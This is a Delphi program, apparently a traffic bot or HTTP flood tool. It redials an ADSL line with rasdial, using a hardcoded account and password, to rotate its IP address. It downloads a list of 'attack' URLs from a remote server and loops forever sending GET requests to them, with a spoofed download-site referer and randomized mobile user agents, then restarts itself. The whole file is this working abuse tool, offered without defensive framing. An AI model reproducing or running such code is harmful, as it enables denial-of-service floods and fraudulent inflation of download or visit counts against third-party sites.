program appnewhua;

uses
  Windows,
  Messages,
  SysUtils,
  Variants,
  Classes,
  ShellAPI,
  Tlhelp32,
  IdIntercept,
  IdInterceptThrottler,

  IdHTTP;

{$R *.res}
var
  gongjiurl: string;
  idHTTP2: TIDHttp;
 listpeizhi, list: tstrings;
  x1,x2, xi: Integer;
  NewCursor: HCursor;
  ExeName: PChar;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
type
  TMyDownLoad = class(TThread)
  protected
    procedure Execute; override;
    procedure Download;
  end;

procedure TMyDownLoad.Download;
var
  UnitName, PathName: string;
  MyStream: TMemoryStream;
  filepath: string;
  idHTTP1: TIDHttp;
  IdInterceptThrottler1: TIdInterceptThrottler;
  x1,x2,j1, j: Integer;
  poststr: string;
  postStream: TStringStream;


begin
  Randomize;

//  IdInterceptThrottler1 := TIdInterceptThrottler.create();
//  IdInterceptThrottler1.RecvBitsPerSec := 8;
//  idHTTP1.Intercept := IdInterceptThrottler1;

//  IdHttp1.AllowCookies := True;
//  IdHttp1.CookieManager := IdCookieManager1;
try
   idHTTP1 := TIDHTTP.Create;
   IdHttp1.Request.Referer := 'http://www.onlinedown.net/soft/565228.htm';
   IdHttp1.Request.UserAgent := 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A403' + inttostr(Random(999999));
  IdHTTP1.HandleRedirects:=true;
  while 1 = 1 do
  begin
   idHTTP1.Get(list[Random(list.Count)]);
//
   end;
finally
   idhttp1.Free   ;
end;

end;

procedure TMyDownLoad.Execute;
begin
  inherited;
  Download;
end;

function WinExecExW(CMD: Pchar; Visiable: integer): DWORD;
var
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin
  FillChar(StartUpInfo, SizeOf(StartUpInfo), $00);
  StartUpInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartUpInfo.wShowWindow := SW_HIDE;
  if CreateProcess(nil, CMD, nil, nil, {运行批处理文件}
    False, IDLE_PRIORITY_CLASS, nil, nil, StartUpInfo,
    ProcessInfo) then
  begin
    WaitForSingleObject(Processinfo.hProcess, INFINITE);
    GetExitCodeProcess(ProcessInfo.hProcess, Result);

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
  end;
end;

begin
  idHTTP2 := TIDHTTP.Create;
  WinExecExW('rasdial /d', 0);
    sleep(3600);
  WinExecExW(pchar('rasdial adsl 057105858542 909188 /phonebook:' + ExtractFilePath(ParamStr(0)) + 'rasphone.pbk'), 0);
                  sleep(3600);
  idHTTP2 := TIDHTTP.Create;
  gongjiurl := idHTTP2.Get('http://www.caiwuhao.com/appnewhua.txt');

  list := tstringlist.create;
  list.Text := gongjiurl;
    TMyDownLoad.Create(false);
//   sleep( Round(3600*20/strtoint(listpeizhi[1])));
  sleep(3600);

 ShellExecute(0, 'open',PChar(ParamStr(0)),nil,nil, SW_SHOWNORMAL);
//  FillChar(ProcessInfo, sizeof(TProcessInformation), 0);
//  FillChar(StartupInfo, Sizeof(TStartupInfo), 0);
//  StartupInfo.cb := Sizeof(TStartupInfo);
//  StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
//  StartupInfo.wShowWindow := SW_SHOW;
//  ExeName := PChar(ParamStr(0)); //所创建进程路径
//  CreateProcess(ExeName, nil, nil, nil, False, NORMAL_PRIORITY_CLASS,
//    nil, nil, StartupInfo, ProcessInfo)

//WinExec(PChar('m10.exe') ,SW_SHOW);
// WinExec(PChar( ParamStr(0)) ,SW_SHOWNORMAL);
end.

